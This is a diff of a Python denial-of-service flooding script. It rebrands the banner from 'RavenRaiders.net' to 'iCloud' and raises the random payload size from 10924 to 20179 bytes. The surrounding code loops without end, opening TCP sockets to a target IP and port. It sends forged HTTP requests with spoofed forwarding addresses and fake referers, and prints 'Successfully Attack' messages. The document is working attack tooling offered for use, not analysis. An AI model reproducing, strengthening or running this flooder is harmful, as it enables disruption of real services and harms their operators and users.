@@ -527,10 +527,10 @@ referers = [
 'http://eu.battle.net/wow/en/search?q=']
 
 print("==========================")
-print("=       RavenRaiders.net       =")
+print("=       iCloud       =")
 print("=    Made By : Python    =")
-print("=          Developer=@ICloud          =")
-print("=     RavenRaiders Security.net   =")
+print("=      Developer=@ICloud          =")
+print("=     METHOD UDP-TCP   =")
 print("==========================")
 print("                          ")
 name = str(input("Your Name : "))
@@ -571,7 +571,7 @@ def run():
     header = get_host + referer + forward + useragent + accept + content + connection +  length + Mozila + "\r\n\r\n"
     randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
     request  = get_host + forward + get_data + connection + useragent + forwards + header + length + randomip + referer + content + accept + Mozila + "\r\n"
-    data = random._urandom(10924)
+    data = random._urandom(20179)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -585,9 +585,9 @@ def run():
                 s.send(str.encode(request))
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
-            print(f"RavenRaiders.net Successfully Attack=> {ip} With Port => {port}")
+            print(f"Cloud Successfully Attack=> {ip} With Port => {port}")
         except :
-            print(f"RavenRaiders.net Successfully Attack=> {ip} With Port => {port}")
+            print(f"Cloud Successfully Attack=> {ip} With Port => {port}")
             s.close()
 
 for y in range(threads):
